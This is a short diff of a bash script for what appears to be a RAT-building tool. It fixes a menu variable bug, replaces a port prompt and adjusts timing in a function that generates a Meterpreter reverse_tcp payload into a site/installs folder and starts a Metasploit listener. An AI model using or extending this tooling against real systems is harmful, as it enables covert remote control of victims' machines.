@@ -370,12 +370,10 @@ menupayloads() {
 	printf "  Exit                                                       = 99\n"
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
-	if [[ $tunoption == 99 ]]; then 
+	if [[ $option == 99 ]]; then 
 		startmenu
 	fi
-	printf 'Choose a local listening port (Example:12345): ' $default_server
-	read lport
-	lport="${lport:-${default_port}}"
+	lip
 	case $option in
 		11)      
 			payload="windows/meterpreter/reverse_tcp"
@@ -562,11 +560,11 @@ MetasploitMe() {
 	service postgresql start > /dev/null 2>&1
 	printf "\e[92mCreating RAT locally, located in the ./site/installs/ folder\n"
 	$meterpreter
-	sleep 3
 	chmod +x site/installs/$pname
 	chmod +x reverse-connect.sh
 	printf "Starting Metasploit with $payload listener...\n"
 	xterm ./reverse-connect.sh &
+	sleep 10
 }
 
 nomachineme() {
